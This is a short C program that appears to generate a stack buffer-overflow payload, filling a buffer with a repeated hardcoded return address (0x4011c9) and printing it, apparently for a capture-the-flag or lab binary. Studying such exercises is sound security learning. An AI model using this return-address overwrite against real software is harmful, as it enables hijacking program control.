#include <stdio.h>

int main() 
{
    int i=0;    
    char stuffing[44]={0};

    for (i=0; i<=20; i+=4) {
        *(long *) &stuffing[i] = 0x4011c9;
		//*(long *) &stuffing[i] = 0x41414141;
    }
    
    puts(stuffing);
    return 0; 
}


